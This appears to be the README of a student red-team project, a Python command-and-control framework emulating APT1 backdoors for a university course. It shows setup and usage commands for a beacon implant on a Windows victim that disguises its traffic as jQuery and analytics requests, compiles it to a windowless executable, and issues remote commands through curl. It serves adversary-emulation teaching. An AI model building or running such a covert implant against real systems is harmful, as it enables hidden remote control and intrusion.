GhostRAT-Lite 👻

APT1 (Unit 61398) Adversary Emulation C2 Framework
Developed for Operation GhostUnit — ST6049CEM Managing Red Teams and Pen Tests
Softwarica College of IT & E-Commerce | Coventry University
Student: Aabishkar Roka | ID: 230476


⚠️ Disclaimer
This tool was developed strictly for educational purposes as part of an academic red team simulation exercise. All testing was conducted within an isolated VirtualBox lab environment with no connection to live systems or real networks. The author does not condone or support any malicious use of this software. Use only in controlled, authorised lab environments.

📋 Overview
GhostRAT-Lite is a lightweight Python-based Command and Control (C2) framework developed to emulate the operational behaviour of APT1's historically documented backdoors — specifically WEBC2 and POISONIVY. The framework was built as part of Operation GhostUnit, a structured adversary emulation exercise mapped entirely to the MITRE ATT&CK Enterprise Framework.
The key design goal of GhostRAT-Lite is to disguise all C2 traffic as normal web activity — HTTP GET requests are disguised as jQuery library fetches, and command results are returned via endpoints mimicking Google Analytics calls. This replicates the exact communication pattern documented in the Mandiant APT1 Intelligence Report (2013).

🏗️ Architecture
┌─────────────────────────────────────────────────────┐
│                   KALI LINUX                        │
│              192.168.56.101                         │
│                                                     │
│   c2_server.py  (Flask C2 Server — Port 5000)      │
│   ┌──────────────────────────────────────┐          │
│   │  GET  /jquery.min.js  ← beacon       │          │
│   │  POST /analytics.js   → results      │          │
│   └──────────────────────────────────────┘          │
└──────────────────────┬──────────────────────────────┘
                       │ Host-Only Network
                       │ 192.168.56.0/24
┌──────────────────────▼──────────────────────────────┐
│                 WINDOWS 10 PRO                      │
│              192.168.56.102                         │
│                                                     │
│   beacon.py / beacon.exe  (Implant)                │
│   Checks in every 5 seconds                         │
│   Disguised as Chrome browser traffic               │
└─────────────────────────────────────────────────────┘

📁 Repository Structure
GhostRAT-Lite/
│
├── c2_server.py        # C2 server — runs on Kali Linux
├── beacon.py           # Beacon implant — runs on Windows victim
├── recon.bat           # APT1-style discovery script
├── requirements.txt    # Python dependencies
└── README.md           # This file

🔧 Installation & Setup
Requirements

Kali Linux (Attacker) — 192.168.56.101
Windows 10 Pro (Victim) — 192.168.56.102
VirtualBox Host-Only Network — 192.168.56.0/24
Python 3.x on both machines
Flask installed on Kali

Kali Linux Setup
bash# Clone the repository
git clone https://github.com/YOUR_USERNAME/GhostRAT-Lite.git
cd GhostRAT-Lite

# Install dependencies
pip install flask requests

# Start the C2 server
python3 c2_server.py
Windows Victim Setup
bash# Install dependencies
pip install requests

# Run beacon directly
python beacon.py

# OR compile to executable
pip install pyinstaller
pyinstaller --onefile --noconsole beacon.py

🚀 Usage
Starting the C2 Server
bashpython3 c2_server.py

# Expected output:
# [*] GhostRAT-Lite C2 Server starting on port 5000
# [*] Waiting for beacon check-ins...
Sending Commands to Victim
bash# Send any Windows command
curl "http://192.168.56.101:5000/set/whoami"
curl "http://192.168.56.101:5000/set/ipconfig"
curl "http://192.168.56.101:5000/set/systeminfo"

# Expected C2 terminal output:
# [BEACON] 192.168.56.102 checked in
# [CMD SENT] whoami
# [RESULT] DESKTOP-GJH1EDS\Aabishkar


👨‍💻 Author
Aabishkar Roka
Student ID: 230476
Module: ST6049CEM — Managing Red Teams and Pen Tests
Softwarica College of IT & E-Commerce | Coventry University
Module Leader: Nirmal Dahal
